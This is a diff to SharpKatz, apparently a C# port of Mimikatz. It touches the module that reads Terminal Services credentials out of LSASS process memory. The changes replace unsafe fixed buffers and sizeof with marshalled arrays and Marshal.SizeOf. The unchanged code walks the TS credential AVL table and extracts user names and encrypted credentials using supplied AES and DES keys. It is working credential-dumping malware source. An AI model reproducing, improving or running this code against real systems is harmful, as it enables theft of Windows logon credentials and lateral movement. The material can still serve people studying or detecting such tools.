@@ -33,13 +33,14 @@ namespace SharpKatz.Module
         };
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct RTL_BALANCED_LINKS
+        public struct RTL_BALANCED_LINKS
         {
             public IntPtr Parent;//RTL_BALANCED_LINKS
             public IntPtr LeftChild;//RTL_BALANCED_LINKS
             public IntPtr RightChild;//RTL_BALANCED_LINKS
             public byte Balance;
-            public fixed byte Reserved[3]; // align
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
+            public byte[] Reserved; // align
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -50,10 +51,10 @@ namespace SharpKatz.Module
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct KIWI_TS_CREDENTIAL
+        public struct KIWI_TS_CREDENTIAL
         {
-
-            public fixed byte unk0[108];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 108)]
+            public byte[] unk0;
 
             LUID LocallyUniqueIdentifier;
             IntPtr unk1;
@@ -62,16 +63,17 @@ namespace SharpKatz.Module
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct KIWI_TS_CREDENTIAL_1607
+        public struct KIWI_TS_CREDENTIAL_1607
         {
-            public fixed byte unk0[112];
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 112)]
+            public byte[] unk0;
             LUID LocallyUniqueIdentifier;
             IntPtr unk1;
             IntPtr unk2;
             IntPtr pTsPrimary; //PKIWI_TS_PRIMARY_CREDENTIAL
         }
 
-        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr tspkgMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static int FindCredentials(IntPtr hLsass, IntPtr tspkgMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             RTL_AVL_TABLE entry;
             IntPtr tsGlobalCredTableAddr;
@@ -83,7 +85,7 @@ namespace SharpKatz.Module
 
             if (tsGlobalCredTableAddr != IntPtr.Zero)
             {
-                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
+                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
                 entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
                 llCurrent = entry.BalancedRoot.RightChild;
@@ -98,23 +100,23 @@ namespace SharpKatz.Module
             }
         }
 
-        private static unsafe void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             
             if (pElement == null)
                 return;
 
-            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
+            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
             RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
             if (entry.OrderedPointer != IntPtr.Zero)
             {
                 byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Convert.ToUInt64(Marshal.SizeOf(oshelper.TSCredType)));
 
-                LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBytes, oshelper.TSCredLocallyUniqueIdentifierOffset, sizeof(LUID)));
+                LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBytes, oshelper.TSCredLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
                 long pCredAddr = BitConverter.ToInt64(krbrLogonSessionBytes, oshelper.TSCredOffset);
 
-                byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Convert.ToUInt64(sizeof(KIWI_TS_PRIMARY_CREDENTIAL)));
+                byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_TS_PRIMARY_CREDENTIAL))));
                 KIWI_TS_PRIMARY_CREDENTIAL pCred = Utility.ReadStruct<KIWI_TS_PRIMARY_CREDENTIAL>(pCredBytes);
 
                 Natives.UNICODE_STRING usUserName = pCred.credentials.UserName;
